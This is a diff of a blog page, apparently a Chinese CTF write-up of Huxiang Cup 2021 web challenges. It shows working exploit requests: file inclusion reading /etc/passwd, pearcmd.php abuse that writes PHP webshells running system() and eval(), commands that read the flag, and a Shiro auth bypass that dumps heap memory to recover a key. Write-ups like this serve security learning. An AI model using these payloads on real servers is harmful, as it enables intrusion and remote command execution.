@@ -143,7 +143,7 @@ Connection: close</code></pre>
 <p><img src="https://storage.tttang.com/media/attachment/2021/11/01/e12aef87-9aea-41bb-a13f-6e0932e6b9cc.png" alt="image-20211101080447027.png"></p>
 <p>最后这个利用方法，无需条件竞争，也没有额外其他的版本限制等，只要是Docker启动的PHP环境即可通过上述一个数据包搞定。</p>
 <h1 id="Easywill"><a href="#Easywill" class="headerlink" title="Easywill"></a>Easywill</h1><p>网上下载源码,丢进seay审计代码：</p>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118110602137.png" alt="image-20211118110602137"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118110602137.png" alt="image-20211118110602137"></p>
 <p>审计到Template.php</p>
 <pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     \<span class="token package">wiphp<span class="token punctuation">\</span>View</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -165,17 +165,17 @@ Connection: close</code></pre>
 <span class="token punctuation">}</span></code></pre>
 <p>$cfile可控</p>
 <pre><code>?name=cfile&amp;value=/etc/passwd</code></pre>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164144041.png" alt="image-20211118164144041"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164144041.png" alt="image-20211118164144041"></p>
 <pre><code>?name=cfile&amp;+config-create+/&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=var_dump(system($_GET[1]));?&gt;+/tmp/a.php</code></pre>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164224693.png" alt="image-20211118164224693"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164224693.png" alt="image-20211118164224693"></p>
 <pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls</code></pre>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164039627.png" alt="image-20211118164039627"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164039627.png" alt="image-20211118164039627"></p>
 <p>乱七八糟，查看根目录</p>
 <pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=ls%20/</code></pre>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118164013390.png" alt="image-20211118164013390"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118164013390.png" alt="image-20211118164013390"></p>
 <p>查看扥目录下的flag32897328937298hdwidh</p>
 <pre><code>?name=cfile&amp;value=/tmp/a.php&amp;1=cat%20/flag32897328937298hdwidh</code></pre>
-<p><img src="/2021/11/15/hu-xiang-bei-2021/image-20211118163936469.png" alt="image-20211118163936469"></p>
+<p><img src="/%E6%B9%96%E6%B9%98%E6%9D%AF2021.assets/image-20211118163936469.png" alt="image-20211118163936469"></p>
 <pre><code>?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/b.php+-d+man_dir=&lt;?@eval($_POST[0]);?&gt;+-s+ </code></pre>
 <p>这还可以用到条件竞争：</p>
 <p>参考：<a target="_blank" rel="noopener" href="https://tttang.com/archive/1312/">https://tttang.com/archive/1312/</a></p>
@@ -226,6 +226,20 @@ if __name__ == '__main__':
     wait(futures)</code></pre>
 <p>脚本执行完毕在目标中写入/tmp/success,里面为webshell：</p>
 <h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>pom.xml里面有个shiro 1.5.0</p>
+<p>扫描目录发现有/actuator文件</p>
+<p>结合shiro鉴权绕过可以成功访问到</p>
+<pre><code>/;/actuator/env</code></pre>
+<pre><code>/;/actuator/heapdump</code></pre>
+<p>找key的工具</p>
+<pre><code>https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html</code></pre>
+<p>还原：</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
+<span class="token keyword">import</span> struct
+str<span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'&lt;bbbbbbbbbbbbbbbb'</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">73</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">81</span><span class="token punctuation">,</span><span class="token number">57</span><span class="token punctuation">,</span><span class="token number">36</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">84</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">56</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">89</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span></code></pre>
+<p>用shiro工具</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/meteox/article/details/121334507">https://blog.csdn.net/meteox/article/details/121334507</a></p>
+<p><a target="_blank" rel="noopener" href="https://ego00.blog.csdn.net/article/details/121323469">https://ego00.blog.csdn.net/article/details/121323469</a></p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
@@ -257,7 +271,7 @@ if __name__ == '__main__':
     </div>
     
         <div class='side'>
-			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pearcmd-php%E5%B0%8Ftrick"><span class="toc-number">1.</span> <span class="toc-text">pearcmd.php小trick</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easywill"><span class="toc-number">2.</span> <span class="toc-text">Easywill</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pentest-in-Autumn"><span class="toc-number">3.</span> <span class="toc-text">Pentest in Autumn</span></a></li></ol>	
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pearcmd-php%E5%B0%8Ftrick"><span class="toc-number">1.</span> <span class="toc-text">pearcmd.php小trick</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Easywill"><span class="toc-number">2.</span> <span class="toc-text">Easywill</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pentest-in-Autumn"><span class="toc-number">3.</span> <span class="toc-text">Pentest in Autumn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>	
         </div>
     
 </div>
